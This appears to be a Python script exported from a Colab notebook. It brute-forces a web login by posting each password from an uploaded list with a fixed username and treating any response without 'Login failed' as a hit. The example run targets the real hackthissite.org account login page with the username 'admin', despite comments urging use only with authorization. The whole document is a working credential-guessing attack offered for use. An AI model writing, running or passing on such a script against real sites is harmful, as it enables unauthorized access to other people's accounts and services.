# -*- coding: utf-8 -*-
"""Untitled7.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1_sSnuiWRl6yUyBihhKJj49BGIGMFkfaI
"""

import requests

from google.colab import files

def brute_force_login(target_url, username, password_list="passwords.txt"):
    """
    Attempts to brute-force login credentials against a target URL.

    Args:
        target_url: The URL of the login form.
        username: The username to try.
        password_list: The path to a file containing a list of passwords.
    """
    try:
        with open(password_list, "r") as file:
            for password in file.readlines():
                password = password.strip()
                data = {"username": username, "password": password}
                try:
                    response = requests.post(target_url, data=data)
                    response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)

                    if "Login failed" not in response.text:
                        print(f"Possible credentials found: {username}:{password}")
                        return
                except requests.exceptions.RequestException as e:
                    print(f"Error during request: {e}") #Print error message
                    continue #continue to next password after error

        print("No valid credentials found.")

    except FileNotFoundError:
        print(f"Error: Password list file '{password_list}' not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

# Example usage (use only on systems you own/control!):
target_url = "https://www.hackthissite.org/user/login" #Example URL, do not use without authorization.
#upload passwords.txt
uploaded = files.upload()
brute_force_login(target_url, "admin")